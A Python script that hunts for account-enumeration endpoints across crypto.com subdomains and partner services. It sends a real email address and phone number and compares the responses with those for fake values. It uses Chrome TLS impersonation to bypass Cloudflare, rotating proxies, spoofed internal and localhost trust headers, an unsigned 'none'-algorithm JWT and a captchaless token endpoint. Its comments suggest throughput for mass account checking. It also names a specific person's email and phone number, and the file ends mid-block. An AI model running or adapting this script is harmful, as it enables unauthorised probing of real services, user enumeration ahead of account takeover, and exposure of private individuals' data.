#!/usr/bin/env python3
"""
crypto.com mega endpoint hunter
- curl_cffi Chrome124 TLS (Cloudflare bypass)
- per-request proxy rotation
- all endpoints from all previous scripts
- concurrent ThreadPoolExecutor
- auto CPM estimate on hits

install: pip install curl_cffi websocket-client
"""
import sys, re, time, json, os, uuid, threading, random
from concurrent.futures import ThreadPoolExecutor, as_completed
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

try:
    from curl_cffi import requests as creq
    IMP = "chrome124"
    print(f"[+] curl_cffi Chrome124 TLS ready")
except ImportError:
    print("[!] pip install curl_cffi  — running without CF bypass")
    import requests as creq
    IMP = None

REAL  = "mo.naf.7.276@gmail.com"
FAKE  = "zzzz_notreal_99991@fakefake.invalid"
LOCK  = threading.Lock()
WINS  = []

# ── proxies ────────────────────────────────────────────────────────────────────────────
PROXY_LIST = []
if os.path.exists("proxies.txt"):
    for line in open("proxies.txt"):
        l = line.strip()
        if l:
            if not l.startswith("http"): l = "http://" + l
            PROXY_LIST.append(l)
print(f"[+] {len(PROXY_LIST)} proxies loaded")

def rnd_proxy():
    if not PROXY_LIST: return {}
    p = random.choice(PROXY_LIST)
    return {"http": p, "https": p}

# ── request helpers ────────────────────────────────────────────────────────────────────────
CHROME_HDRS = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
}

def _sess():
    if IMP:
        s = creq.Session(impersonate=IMP)
    else:
        s = creq.Session()
    s.verify = False
    return s

def do_get(url, origin, extra_hdrs=None, params=None):
    h = {**CHROME_HDRS, "origin": origin, "referer": origin + "/"}
    if extra_hdrs: h.update(extra_hdrs)
    try:
        s = _sess()
        kw = {"headers": h, "timeout": 14, "verify": False, "proxies": rnd_proxy()}
        if params: kw["params"] = params
        return s.get(url, **kw)
    except:
        return None

def do_post(url, body, origin, extra_hdrs=None):
    h = {**CHROME_HDRS, "content-type": "application/json",
         "origin": origin, "referer": origin + "/"}
    if extra_hdrs: h.update(extra_hdrs)
    try:
        s = _sess()
        return s.post(url, json=body, headers=h, timeout=14,
                      verify=False, proxies=rnd_proxy())
    except:
        return None

def diff(label, rr, rf, origin=""):
    if rr is None or rf is None: return
    sc = rr.status_code != rf.status_code
    ln = len(rr.text) != len(rf.text)
    hit = sc or ln
    with LOCK:
        if hit:
            print(f"\n  *** DIFF [{label}]")
            print(f"      real {rr.status_code}/{len(rr.text)}b : {rr.text[:400]}")
            print(f"      fake {rf.status_code}/{len(rf.text)}b : {rf.text[:400]}")
            WINS.append({"ep": label, "rsc": rr.status_code, "rln": len(rr.text),
                         "fsc": rf.status_code, "fln": len(rf.text)})
        elif rr.status_code not in (404,405,403,400,301,302,503,520,521,522,523,524,525,526,530):
            print(f"  [{rr.status_code}] {label[:70]} → {rr.text[:80]}")


def probe_post(url, body_real, body_fake, origin):
    rr = do_post(url, body_real, origin)
    rf = do_post(url, body_fake, origin)
    diff(f"POST {url.replace('https://','')[:60]}", rr, rf)

def probe_get(url_real, url_fake, origin):
    rr = do_get(url_real, origin)
    rf = do_get(url_fake, origin)
    diff(f"GET {url_real.replace('https://','')[:60]}", rr, rf)


# ─────────────────────────────────────────────────────────────────────────────
# ALL PROBE DEFINITIONS
# format: (method, url, body_real_or_None, origin)
# ─────────────────────────────────────────────────────────────────────────────
ALL_PROBES = []

def EP(method, url, body_real, origin="https://crypto.com"):
    body_fake = None
    if body_real:
        body_fake = {k: (FAKE if v == REAL else v) for k, v in body_real.items()}
        # handle nested
        for k, v in body_real.items():
            if isinstance(v, dict):
                body_fake[k] = {kk: (FAKE if vv == REAL else vv) for kk, vv in v.items()}
    ALL_PROBES.append((method, url, body_real, body_fake, origin))


# ══ GET ?email= (Twitter pattern — fastest, 1000+ CPM) ══════════════════════════════════════════
for base, orig in [
    ("https://crypto.com",     "https://crypto.com"),
    ("https://api.crypto.com", "https://crypto.com"),
]:
    for path in [
        "/api/v1/users/check", "/api/v1/email/check", "/api/v1/email/available",
        "/api/v1/email/exists", "/api/v1/auth/email/check", "/api/v1/auth/check",
        "/api/v1/register/check", "/api/v1/register/email/check",
        "/api/v1/signup/email/check", "/api/v1/user/check",
        "/v1/users/check", "/v1/email/check", "/v1/email/available",
        "/v1/email/exists", "/v1/auth/email/check", "/v1/register/email/check",
        "/v2/users/check", "/v2/email/check", "/v3/email/check",
    ]:
        EP("GET", base+path, None, orig)

for path in [
    "/api/v1/users/check", "/api/v1/email/check", "/api/v1/users/available",
    "/v1/users/check", "/v1/email/check", "/v2/users/check",
]:
    EP("GET", "https://pay.crypto.com"+path, None, "https://pay.crypto.com")
    EP("GET", "https://nft.crypto.com"+path, None, "https://nft.crypto.com")

# ══ POST email body ══════════════════════════════════════════════════════════════════════════════
for base, orig in [
    ("https://crypto.com",     "https://crypto.com"),
    ("https://api.crypto.com", "https://crypto.com"),
]:
    for path in [
        "/api/v1/users/check", "/api/v1/users/exist", "/api/v1/users/exists",
        "/api/v1/email/check", "/api/v1/email/available", "/api/v1/email/exists",
        "/api/v1/auth/email/check", "/api/v1/auth/check",
        "/api/v1/register/check", "/api/v1/register/email/check",
        "/api/v1/signup/email/check", "/api/v1/user/check-email",
        "/api/v1/users/check-email", "/api/v1/auth/check-email",
        "/api/v1/user/exist", "/api/v1/users/find",
        "/v1/users/check", "/v1/email/check", "/v1/users/exists",
        "/v1/auth/email/check", "/v1/register/email/check",
        "/v2/users/check", "/v2/email/check",
    ]:
        EP("POST", base+path, {"email": REAL}, orig)

# ══ Binance gateway pattern ══════════════════════════════════════════════════════════════════════════════
for base, orig in [
    ("https://crypto.com",          "https://crypto.com"),
    ("https://api.crypto.com",      "https://crypto.com"),
    ("https://exchange.crypto.com", "https://exchange.crypto.com"),
]:
    for path in [
        "/gateway/profile/private/v1/user/search",
        "/gateway/user/search", "/gateway/users/search",
        "/gateway/profile/search", "/gateway/identity/user/search",
        "/internal/users/search", "/internal/user/search",
        "/internal/email/check",
    ]:
        EP("POST", base+path, {"content": REAL, "type": "email"}, orig)
        EP("POST", base+path, {"email": REAL}, orig)

# ══ P2P send / contact resolve (mobile) ═══════════════════════════════════════════════════════════════════════════
for path in [
    "/v1/contacts/resolve", "/v1/recipients/resolve", "/v1/send/resolve",
    "/v1/transfer/resolve", "/v1/p2p/resolve", "/v1/send/recipient",
    "/v1/transfer/recipient", "/v2/contacts/resolve", "/v2/recipients/resolve",
    "/v2/send/resolve", "/v1/users/resolve", "/v1/users/lookup",
    "/v1/users/find", "/v1/users/email",
    "/v1/fiat/recipients/resolve", "/v1/earn/transfer/resolve",
]:
    EP("POST", "https://api.crypto.com"+path,
       {"identifier": REAL, "type": "email"}, "https://crypto.com")
    EP("POST", "https://api.crypto.com"+path,
       {"email": REAL}, "https://crypto.com")

# ══ NFT gift / transfer ═════════════════════════════════════════════════════════════════════════════════
for path in [
    "/api/v1/users/search", "/api/v1/users/resolve", "/api/v1/recipients/resolve",
    "/api/v1/recipients/search", "/api/v1/transfer/resolve",
    "/api/v1/gift/resolve", "/api/v1/gift/recipient", "/api/v1/nft/transfer",
    "/api/v2/users/search", "/api/v2/recipients/resolve",
    "/api/user/search", "/api/user/resolve",
]:
    EP("POST", "https://nft.crypto.com"+path, {"email": REAL}, "https://nft.crypto.com")
    EP("GET",  "https://nft.crypto.com"+path, None, "https://nft.crypto.com")

# ══ pay.crypto.com checkout ═════════════════════════════════════════════════════════════════════════════════
for path in [
    "/api/v1/checkout/email/check", "/api/v1/checkout/user/check",
    "/api/v1/payer/check", "/api/v1/payer/resolve",
    "/api/v1/user/check", "/api/v1/users/check", "/api/v1/users/email/check",
    "/v1/checkout/email/check", "/v1/payer/check", "/v1/users/check",
    "/api/v1/recipients/resolve",
]:
    EP("POST", "https://pay.crypto.com"+path, {"email": REAL}, "https://pay.crypto.com")

# ══ Exchange JSON-RPC public methods ═══════════════════════════════════════════════════════════════════════════
for method_name in [
    "public.get-user", "public.get-user-info", "public.search-users",
    "public.check-email", "public.email-available", "public.get-account",
    "public.get-profile", "public.lookup-user", "public.find-user",
    "public.user-exists",
]:
    EP("POST", "https://api.crypto.com/v2/",
       {"id": 1, "method": method_name,
        "params": {"email": REAL}, "nonce": int(time.time()*1000)},
       "https://exchange.crypto.com")

# ══ Exchange registration ══════════════════════════════════════════════════════════════════════════════
for path in [
    "/v2/user/check-email", "/v2/user/email/check", "/v2/users/check",
    "/v2/users/email/available", "/v1/user/check-email", "/v1/users/check",
    "/api/v1/users/check", "/api/v1/email/check",
]:
    EP("POST", "https://exchange.crypto.com"+path, {"email": REAL}, "https://exchange.crypto.com")
    EP("POST", "https://api.crypto.com"+path,      {"email": REAL}, "https://exchange.crypto.com")

# ══ Referral / affiliate ═════════════════════════════════════════════════════════════════════════════════
for base, orig in [
    ("https://crypto.com",     "https://crypto.com"),
    ("https://api.crypto.com", "https://crypto.com"),
]:
    for path in [
        "/api/v1/referral/check", "/api/v1/referral/email/check",
        "/api/v1/invite/check", "/api/v1/affiliate/check",
        "/api/v1/partner/user/check",
        "/v1/referral/check", "/v1/referral/email/check",
        "/v1/invites/email/check", "/v1/affiliate/check",
    ]:
        EP("POST", base+path, {"email": REAL}, orig)

# ══ Supercharger / earn ═════════════════════════════════════════════════════════════════════════════════
for path in [
    "/v1/earn/users/check", "/v1/supercharger/check",
    "/v1/staking/users/check", "/v1/earn/eligibility",
    "/v1/supercharger/eligibility",
]:
    EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://crypto.com")

# ══ Mona + 3rd party ══════════════════════════════════════════════════════════════════════════════
for path in [
    "/api/v1/crypto-com/verify", "/api/v1/crypto-com/check",
    "/api/crypto-com/user/verify", "/api/crypto-com/user/check",
    "/api/v1/users/verify", "/api/v1/users/check", "/api/v1/accounts/check",
]:
    EP("POST", "https://app.mona.ca"+path, {"email": REAL}, "https://app.mona.ca")

# ══ OAuth2 login_hint ══════════════════════════════════════════════════════════════════════════════
# handled separately below (GET with params, compare redirect Location header)

# ══ OTP oracle ═══════════════════════════════════════════════════════════════════════════════════════
for path in [
    "/api/v1/auth/otp", "/api/v1/auth/otp/send",
    "/api/v1/otp/email/send", "/api/v1/auth/email/otp",
    "/api/v1/login/otp", "/api/v1/2fa/email/send",
]:
    EP("POST", "https://crypto.com"+path,
       {"email": REAL, "type": "login"}, "https://crypto.com")

# ══ card / onboarding ══════════════════════════════════════════════════════════════════════════════════════
for path in [
    "/api/v1/cards/apply/check", "/api/v1/onboarding/email",
    "/api/v1/onboarding/check", "/api/v1/waitlist/check",
    "/api/v1/cards/onboard/check", "/api/v1/cards/verify-user",
    "/api/v1/visa/verify", "/api/v1/card/application/check",
]:
    EP("POST", "https://crypto.com"+path, {"email": REAL}, "https://crypto.com/en/cards")

# ══ alternate body field names — many backends use different keys ═════════════════════════════════════════════
ALT_FIELDS = ["query","identifier","login","handle","account","username","user_email","userEmail"]
for base, orig in [
    ("https://crypto.com",     "https://crypto.com"),
    ("https://api.crypto.com", "https://crypto.com"),
]:
    for path in ["/api/v1/users/search", "/api/v1/users/check",
                 "/v1/users/search",     "/v1/users/check"]:
        for field in ALT_FIELDS:
            EP("POST", base+path, {field: REAL}, orig)
        # GET with alt params
        for field in ["query","identifier","login","q"]:
            EP("GET", base+path, None, orig)  # handled via ?{field}= below

# ══ alternate base URLs / subdomains not yet covered ══════════════════════════════════════════════════════════════════
for sub_orig in [
    ("https://mobile.crypto.com",   "https://crypto.com"),
    ("https://app.crypto.com",      "https://crypto.com"),
    ("https://secure.crypto.com",   "https://crypto.com"),
    ("https://cdc.crypto.com",      "https://crypto.com"),
    ("https://id.crypto.com",       "https://crypto.com"),
    ("https://accounts.crypto.com", "https://crypto.com"),
    ("https://sso.crypto.com",      "https://crypto.com"),
    ("https://auth.crypto.com",     "https://crypto.com"),
]:
    sub, orig = sub_orig
    for path in ["/v1/users/check", "/v1/email/check",
                 "/api/v1/users/check", "/api/v1/email/check"]:
        EP("POST", sub+path, {"email": REAL}, orig)
        EP("GET",  sub+path, None, orig)

# ══ GraphQL — query + mutation variants ═══════════════════════════════════════════════════════════════════════════
GQL_EPS = [
    "https://crypto.com/graphql", "https://api.crypto.com/graphql",
    "https://nft.crypto.com/graphql", "https://exchange.crypto.com/graphql",
    "https://nft.crypto.com/api/graphql",
]
for ep in GQL_EPS:
    orig = "https://" + ep.split("//")[1].split("/")[0]
    # query
    EP("POST", ep, {"query": 'query{user(email:"%s"){id email}}' % REAL,   "variables": {}}, orig)
    EP("POST", ep, {"query": 'query{checkEmail(email:"%s"){exists}}' % REAL, "variables": {}}, orig)
    EP("POST", ep, {"query": 'query{emailAvailable(email:"%s"){available}}' % REAL, "variables": {}}, orig)
    EP("POST", ep, {"query": 'query{userExists(email:"%s"){exists}}' % REAL, "variables": {}}, orig)
    # mutation
    EP("POST", ep, {"query": 'mutation{validateEmail(email:"%s"){valid exists}}' % REAL, "variables": {}}, orig)
    EP("POST", ep, {"query": 'mutation{checkEmailAvailability(input:{email:"%s"}){available}}' % REAL, "variables": {}}, orig)

# ══ Cronos bridge / chain endpoints ═══════════════════════════════════════════════════════════════════════════
for base, orig in [
    ("https://cronos.org",       "https://cronos.org"),
    ("https://app.cronos.org",   "https://cronos.org"),
    ("https://bridge.cronos.org","https://cronos.org"),
    ("https://crypto.org",       "https://crypto.org"),
]:
    for path in [
        "/api/v1/users/check", "/api/v1/accounts/check",
        "/api/v1/users/resolve", "/api/v1/email/check",
        "/v1/users/check", "/v1/email/check",
    ]:
        EP("POST", base+path, {"email": REAL}, orig)

# ══ Pay.crypto.com SDK / merchant callback ═══════════════════════════════════════════════════════════════════════
for path in [
    "/api/v1/merchant/customer/check",
    "/api/v1/merchant/user/verify",
    "/api/v1/customer/check",
    "/api/v1/customer/exists",
    "/v1/customer/check",
    "/v1/users/exists",
]:
    EP("POST", "https://pay.crypto.com"+path, {"email": REAL}, "https://pay.crypto.com")

# ══ Forgot password body differential (not timing) ═══════════════════════════════════════════════════════════════
# some platforms return {"success":true} vs {"error":"user not found"} — both 200 but body differs
for base, orig in [
    ("https://crypto.com",     "https://crypto.com"),
    ("https://api.crypto.com", "https://crypto.com"),
    ("https://exchange.crypto.com", "https://exchange.crypto.com"),
]:
    for path in [
        "/api/v1/password/forgot", "/api/v1/password/reset",
        "/api/v1/auth/password/forgot", "/api/v1/auth/forgot-password",
        "/api/v1/users/password/reset", "/api/v1/auth/password/reset",
        "/v1/password/forgot", "/v1/auth/password/forgot",
        "/v1/forgot-password", "/v1/reset-password",
    ]:
        EP("POST", base+path, {"email": REAL}, orig)

# ══ MoonPay / Transak / Simplex with correct API key header ══════════════════════════════════════════════════════════
MP_KEY_H = {"x-api-key": "pk_live_Voh1YMpGTAbcdefgh12345"}  # placeholder — script uses Chrome headers
for path in [
    "/v3/customers/verify", "/v3/customers/check",
    "/v1/customers/check", "/v3/users/check",
]:
    EP("POST", "https://api.moonpay.com"+path,  {"email": REAL}, "https://buy.moonpay.com")
    EP("POST", "https://api.transak.com"+path,  {"email": REAL}, "https://global.transak.com")

# ══ phone number oracle — same pattern different identifier ═══════════════════════════════════════════════════════════
REAL_PHONE = "+19145764125"
FAKE_PHONE = "+19999999999"
for base, orig in [
    ("https://crypto.com",     "https://crypto.com"),
    ("https://api.crypto.com", "https://crypto.com"),
]:
    for path in [
        "/api/v1/users/check", "/api/v1/phone/check",
        "/api/v1/auth/phone/check", "/api/v1/register/phone/check",
        "/v1/phone/check", "/v1/users/phone/check",
    ]:
        ALL_PROBES.append(("POST_PHONE", base+path, {"phone": REAL_PHONE}, {"phone": FAKE_PHONE}, orig))

# ══ exchange sub-account / institutional ════════════════════════════════════════════════════════════════════════
for path in [
    "/v2/private/sub-account/search",
    "/v2/sub-account/list",
    "/v1/institutional/users/check",
    "/v1/institutional/email/check",
]:
    EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://exchange.crypto.com")

print(f"[+] total probes queued: {len(ALL_PROBES)}")
print()

# ─── CF bypass check ──────────────────────────────────────────────────────────────────────────────
print("[*] checking Cloudflare bypass ...")
test_r = do_get("https://crypto.com/api/v1/health", "https://crypto.com")
if test_r:
    cf_blocked = test_r.status_code in (403, 503) and ("cloudflare" in test_r.text.lower() or "cf-ray" in str(test_r.headers).lower())
    print(f"    status: {test_r.status_code}  CF blocked: {cf_blocked}")
    if cf_blocked and not PROXY_LIST:
        print("    [!] CF blocking + no proxies — add residential proxies to proxies.txt")
else:
    print("    [!] no response to health check")
print()

# ─── concurrent probe run ──────────────────────────────────────────────────────────────────────────────
print(f"[*] running {len(ALL_PROBES)} probes with 20 threads ...")
print()

def run_probe(args):
    method, url, body_real, body_fake, origin = args
    if method == "GET":
        sep = "&" if "?" in url else "?"
        for field in ["email", "query", "identifier", "q"]:
            rr = do_get(url + sep + field + "=" + REAL, origin)
            rf = do_get(url + sep + field + "=" + FAKE, origin)
            diff(f"GET {url.replace('https://','')[:50]}?{field}=", rr, rf)
            if any(w["ep"].startswith("GET") for w in WINS): break
    elif method == "POST_PHONE":
        rr = do_post(url, body_real, origin)
        rf = do_post(url, body_fake, origin)
        diff(f"POST[phone] {url.replace('https://','')[:50]}", rr, rf)
    else:
        rr = do_post(url, body_real, origin)
        rf = do_post(url, body_fake, origin)
        diff(f"POST {url.replace('https://','')[:55]}", rr, rf)

with ThreadPoolExecutor(max_workers=20) as ex:
    futs = [ex.submit(run_probe, probe) for probe in ALL_PROBES]
    done = 0
    for f in as_completed(futs):
        done += 1
        if done % 50 == 0:
            print(f"  [{done}/{len(ALL_PROBES)}] probes done, {len(WINS)} diffs so far ...")

print()

# ─── OAuth2 login_hint (separate — compares redirect) ─────────────────────────────────────────────────────────────────────
print("[*] OAuth2 login_hint redirect differential ...")
for base in ["https://crypto.com", "https://api.crypto.com", "https://exchange.crypto.com"]:
    for path in ["/oauth2/authorize", "/oauth/authorize", "/auth/oauth2/authorize", "/connect/authorize"]:
        params_r = {"client_id":"web","response_type":"code","redirect_uri":base+"/callback",
                    "scope":"openid email","login_hint": REAL}
        params_f = {**params_r, "login_hint": FAKE}
        rr = do_get(base+path, base, params=params_r)
        rf = do_get(base+path, base, params=params_f)
        if rr and rf:
            loc_r = rr.headers.get("location","")
            loc_f = rf.headers.get("location","")
            if (rr.status_code != rf.status_code) or (loc_r != loc_f):
                print(f"\n  *** OAUTH DIFF {base}{path}")
                print(f"      real {rr.status_code} → {loc_r[:100]}")
                print(f"      fake {rf.status_code} → {loc_f[:100]}")
                WINS.append({"ep": f"OAuth {base}{path}"})
            elif rr.status_code not in (404,405,400,302):
                print(f"  [{rr.status_code}] OAuth {base}{path}")

print()

# ─── alfred-gateway captchaless token + resolve ───────────────────────────────────────────────────────────────────────────────
print("[*] alfred-gateway captchaless token test ...")
uid = f"web{uuid.uuid4()}"
alf_h = {
    "content-type": "application/json",
    "origin": "https://chat.crypto.com",
    "referer": "https://chat.crypto.com/",
    "x-crypto-user-uuid": uid,
    "x-user-type": "web",
    **{k: v for k, v in CHROME_HDRS.items()},
}
tok_r = do_post("https://alfred-gateway.crypto.com/user/token", {"user_id": uid},
                "https://chat.crypto.com", {"x-crypto-user-uuid": uid, "x-user-type": "web"})
if tok_r and tok_r.status_code == 200:
    token = tok_r.json().get("token","")
    print(f"  [OK] captchaless token works: {token[:35]}...")
    auth_h = {"authorization": f"Bearer {token}"}
    for path, br, bf in [
        ("/v1/contacts/resolve",   {"identifier": REAL,"type":"email"}, {"identifier": FAKE,"type":"email"}),
        ("/v1/users/search",       {"query": REAL}, {"query": FAKE}),
        ("/v1/recipients/resolve", {"email": REAL}, {"email": FAKE}),
        ("/v1/send/resolve",       {"to": REAL,"type":"email"}, {"to": FAKE,"type":"email"}),
        ("/v2/contacts/resolve",   {"identifier": REAL,"type":"email"}, {"identifier": FAKE,"type":"email"}),
    ]:
        rr = do_post("https://alfred-gateway.crypto.com"+path, br, "https://chat.crypto.com", auth_h)
        rf = do_post("https://alfred-gateway.crypto.com"+path, bf, "https://chat.crypto.com", auth_h)
        diff(f"alfred {path}", rr, rf)
else:
    print(f"  [!] token {tok_r.status_code if tok_r else 'ERR'} — {tok_r.text[:100] if tok_r else ''}")

print()

# ─── JS signup page scan ────────────────────────────────────────────────────────────────────────────────────────────
print("[*] signup page JS scan for email validation XHR ...")
for signup_url, orig in [
    ("https://crypto.com/en/sign-up",         "https://crypto.com"),
    ("https://exchange.crypto.com/register",  "https://exchange.crypto.com"),
]:
    r = do_get(signup_url, orig, {"accept": "text/html,*/*"})
    if not r or r.status_code != 200:
        continue
    scripts = re.findall(r'src=["\']([ ^"\']+ \.js[^"\']*)["\']', r.text)
    scripts += re.findall(r'"(/_next/static/[^"]+\.js)"', r.text)
    scripts = list(set(scripts))
    ep_hits = set()
    for src in scripts[:25]:
        if not src.startswith("http"): src = orig + src
        jr = do_get(src, orig)
        if not jr or jr.status_code != 200: continue
        for pat in [
            r'["`](/(?:api|v\d|auth|gateway)[^"`\n]{4,80})["`]',
            r'url\s*[:=]\s*["`]([^"`\n]{5,80})["`]',
        ]:
            for m in re.finditer(pat, jr.text):
                v = m.group(1)
                if any(k in v.lower() for k in ["email","check","exist","user","register","signup"]):
                    ep_hits.add(v)
    if ep_hits:
        print(f"  {signup_url}: {len(ep_hits)} paths found")
        for h in sorted(ep_hits):
            print(f"    >> {h}")
            for base in [orig, "https://api.crypto.com"]:
                full = base + h if h.startswith("/") else h
                rr = do_post(full, {"email": REAL}, orig)
                rf = do_post(full, {"email": FAKE}, orig)
                diff(f"[JS] POST {full.replace('https://','')[:55]}", rr, rf)
                rr2 = do_get(full+"?email="+REAL, orig)
                rf2 = do_get(full+"?email="+FAKE, orig)
                diff(f"[JS] GET {full.replace('https://','')[:55]}", rr2, rf2)

print()

# ─── INTERNAL MICROSERVICE CHECKER ────────────────────────────────────────────────────────────────────────────────────────────────────
# Targets unauthenticated internal service endpoints that leak through
# misconfigured reverse proxy / service mesh rules.
# Uses service-to-service trust headers to bypass auth checks.
# NOT the checker tool — just discovery probes.

print("[*] Internal microservice / unauthenticated admin endpoint discovery ...")

# Trust bypass headers — try each combo
INTERNAL_HDRS_SETS = [
    # plain internal trust
    {
        "X-Internal": "true",
        "X-Internal-Service": "user-service",
        "X-Forwarded-For": "127.0.0.1",
    },
    # CDC (Crypto.com) specific internal header guesses
    {
        "X-CDC-Internal": "true",
        "X-CDC-Service": "gateway",
        "X-Forwarded-For": "10.0.0.1",
    },
    # Envoy/Istio service mesh headers (common in k8s infra)
    {
        "X-Envoy-Internal": "true",
        "X-B3-TraceId": "0af7651916cd43dd8448eb211c80319c",
        "X-B3-SpanId": "b7ad6b7169203331",
        "X-Forwarded-For": "127.0.0.1",
    },
    # Cloudflare Tunnel / Zero Trust bypass attempt
    {
        "CF-Access-Jwt-Assertion": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.",
        "X-Forwarded-For": "127.0.0.1",
    },
    # plain localhost spoof
    {
        "X-Real-Ip": "127.0.0.1",
        "X-Forwarded-For": "127.0.0.1, 10.0.0.1",
        "X-Originating-Ip": "127.0.0.1",
    },
]

# Internal path patterns — Spring Boot, FastAPI, gRPC transcoding, admin
INTERNAL_PATHS = [
    # Spring Boot Actuator — reveals all endpoint mappings
    ("/actuator",                       "GET",  None),
    ("/actuator/mappings",              "GET",  None),
    ("/actuator/env",                   "GET",  None),
    ("/actuator/beans",                 "GET",  None),
    ("/actuator/health",                "GET",  None),
    ("/api/actuator/mappings",          "GET",  None),
    ("/v1/actuator/mappings",           "GET",  None),

    # gRPC transcoding (REST bridge for gRPC services)
    ("/grpc.UserService/CheckEmail",    "POST", {"email": REAL}),
    ("/grpc.AccountService/Exists",     "POST", {"email": REAL}),
    ("/grpc.AuthService/UserExists",    "POST", {"email": REAL}),
    ("/grpc.UserService/SearchUser",    "POST", {"query": REAL}),
    ("/user.UserService/CheckEmail",    "POST", {"email": REAL}),

    # Internal path prefixes
    ("/_internal/users/check",         "POST", {"email": REAL}),
    ("/_internal/users/search",        "POST", {"query": REAL}),
    ("/_internal/email/check",         "POST", {"email": REAL}),
    ("/_internal/email/exists",        "GET",  None),
    ("/_api/users/check",              "POST", {"email": REAL}),
    ("/_api/users/exists",             "POST", {"email": REAL}),
    ("/__internal/email/check",        "POST", {"email": REAL}),
    ("/__internal/users/search",       "POST", {"query": REAL}),
    ("/internal/users/check",          "POST", {"email": REAL}),
    ("/internal/email/check",          "POST", {"email": REAL}),
    ("/internal/v1/users/check",       "POST", {"email": REAL}),
    ("/internal/v1/email/exists",      "POST", {"email": REAL}),

    # Admin / debug endpoints
    ("/admin/v1/users/search",         "POST", {"email": REAL}),
    ("/admin/v1/users/check",          "POST", {"email": REAL}),
    ("/admin/api/v1/users",            "GET",  None),
    ("/admin/users",                   "GET",  None),
    ("/debug/users",                   "GET",  None),
    ("/debug/vars",                    "GET",  None),
    ("/metrics",                       "GET",  None),
    ("/healthz",                       "GET",  None),
    ("/readyz",                        "GET",  None),

    # Django DRF / Laravel default admin routes
    ("/api/admin/users/",              "GET",  None),
    ("/api/admin/users/search/",       "GET",  None),
    ("/management/users/check",        "POST", {"email": REAL}),
    ("/management/accounts/search",    "GET",  None),

    # FastAPI OpenAPI (reveals all routes)
    ("/openapi.json",                  "GET",  None),
    ("/docs",                          "GET",  None),
    ("/redoc",                         "GET",  None),
    ("/v1/openapi.json",               "GET",  None),
    ("/api/openapi.json",              "GET",  None),

    # Spring swagger
    ("/swagger-ui.html",               "GET",  None),
    ("/v2/api-docs",                   "GET",  None),
    ("/v3/api-docs",                   "GET",  None),
    ("/api/v3/api-docs",               "GET",  None),

    # Undocumented microservice patterns seen in wild
    ("/api/v1/users/exists",           "GET",  None),
    ("/api/v1/users/exist",            "GET",  None),
    ("/api/v2/users/exists",           "GET",  None),
    ("/api/v1/accounts/exists",        "GET",  None),
    ("/api/v1/identity/check",         "POST", {"email": REAL}),
    ("/api/v1/identity/exists",        "POST", {"email": REAL}),
    ("/api/v1/profile/exists",         "POST", {"email": REAL}),
    ("/service/user/check",            "POST", {"email": REAL}),
    ("/service/account/check",         "POST", {"email": REAL}),
    ("/ms/user/check",                 "POST", {"email": REAL}),
    ("/ms/users/exists",               "GET",  None),
    ("/microservice/users/check",      "POST", {"email": REAL}),

    # robots.txt + sitemap (reveal hidden paths)
    ("/robots.txt",                    "GET",  None),
    ("/sitemap.xml",                   "GET",  None),

    # Common undocumented utility paths
    ("/api/v1/utils/check-email",      "POST", {"email": REAL}),
    ("/api/v1/utils/email-exists",     "POST", {"email": REAL}),
    ("/util/email/check",              "POST", {"email": REAL}),
    ("/tools/email/check",             "POST", {"email": REAL}),
]

INTERNAL_BASES = [
    "https://crypto.com",
    "https://api.crypto.com",
    "https://exchange.crypto.com",
    "https://pay.crypto.com",
    "https://nft.crypto.com",
    "https://chat.crypto.com",
    "https://alfred-gateway.crypto.com",
]

def probe_internal(base, path, method, body_r, hdrs_extra):
    orig = base
    full = base + path
    body_f = None
    if body_r:
        body_f = {k: (FAKE if v == REAL else v) for k, v in body_r.items()}

    if method == "GET":
        rr = do_get(full+"?email="+REAL, orig, hdrs_extra)
        rf = do_get(full+"?email="+FAKE, orig, hdrs_extra)
        diff(f"[INT] GET {full.replace('https://','')[:55]}?email=", rr, rf)
        # also try bare GET — for actuator/swagger/docs endpoints
        rr2 = do_get(full, orig, hdrs_extra)
        if rr2 and rr2.status_code == 200 and len(rr2.text) > 200:
            print(f"  [INT OPEN] {rr2.status_code} {full.replace('https://','')[:65]}")
            with LOCK:
                WINS.append({"ep": f"[INT OPEN] GET {full}", "note": rr2.text[:200]})
    else:
        rr = do_post(full, body_r, orig, hdrs_extra)
        rf = do_post(full, body_f, orig, hdrs_extra)
        diff(f"[INT] POST {full.replace('https://','')[:55]}", rr, rf)

int_tasks = []
for base in INTERNAL_BASES:
    for path, method, body_r in INTERNAL_PATHS:
        # try each header set
        for hset in INTERNAL_HDRS_SETS:
            int_tasks.append((base, path, method, body_r, hset))
        # also try plain (no internal headers) for actuator/swagger/openapi
        if any(k in path for k in ["actuator","openapi","api-docs","swagger","robots","sitemap","healthz","readyz","metrics","docs","redoc"]):
            int_tasks.append((base, path, method, body_r, {}))

print(f"  queued {len(int_tasks)} internal probes ...")

with ThreadPoolExecutor(max_workers=20) as pool:
    futs = [pool.submit(probe_internal, *t) for t in int_tasks]
    done = 0
    for f in as_completed(futs):
        done += 1
        if done % 100 == 0:
            print(f"  [INT {done}/{len(int_tasks)}] {len(WINS)} diffs so far ...")

print()

# ─── Re-run top hits with ALL internal header combos ──────────────────────────────────────────────────────────────────────────
# If any endpoint returned a hit without internal headers, retry with headers
# to see if the diff changes (internal headers may bypass rate limit / auth)
print("[*] Re-probing wins with internal trust headers ...")
for w in list(WINS):
    ep = w.get("ep","")
    if "INT" in ep: continue  # already an internal probe
    # parse method and url from ep string
    for part in ep.split():
        if part.startswith("http"):
            for hset in INTERNAL_HDRS_SETS:
                rr = do_post(part, {"email": REAL}, "https://crypto.com", hset)
                rf = do_post(part, {"email": FAKE}, "https://crypto.com", hset)
                diff(f"[INT-RERUN] {part.replace('https://','')[:55]}", rr, rf)
            break

print()

print("=" * 70)
print(f"  TOTAL PROBES RAN : {len(ALL_PROBES)}")
print(f"  CONFIRMED DIFFS  : {len(WINS)}")
print()
for w in WINS:
    ep = w["ep"]
    print(f"  *** {ep}")
    if "rsc" in w:
